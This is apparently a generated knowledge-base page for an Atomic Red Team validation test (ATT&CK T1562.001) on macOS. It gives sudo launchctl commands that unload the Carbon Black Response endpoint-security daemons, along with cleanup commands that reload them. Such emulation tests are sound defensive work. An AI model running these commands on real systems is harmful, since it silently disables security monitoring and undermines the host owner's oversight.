---
atomic_guid: "8fba7766-2d11-4b4a-979a-1e3d9cc9a88c"
title: "Disable Carbon Black Response"
framework: "atomic"
generated: "true"
attack_technique_id: "T1562.001"
attack_technique_name: "Impair Defenses: Disable or Modify Tools"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.yaml"
build_date: "2026-04-27 19:12:28"
executor: "sh"
aliases:
  - "8fba7766-2d11-4b4a-979a-1e3d9cc9a88c"
  - "Disable Carbon Black Response"
platforms:
  - "macos"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Disables Carbon Black Response

## ATT&CK Mapping

- [[kb/attack/techniques/T1562-impair_defenses#^t1562001-disable-or-modify-tools|T1562.001: Disable or Modify Tools]]

## Executor

- elevation_required: True
- name: sh

### Command

```bash
sudo launchctl unload /Library/LaunchDaemons/com.carbonblack.daemon.plist
sudo launchctl unload /Library/LaunchDaemons/com.carbonblack.defense.daemon.plist
```

### Cleanup

```bash
sudo launchctl load -w /Library/LaunchDaemons/com.carbonblack.daemon.plist
sudo launchctl load -w /Library/LaunchDaemons/com.carbonblack.defense.daemon.plist
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.yaml)
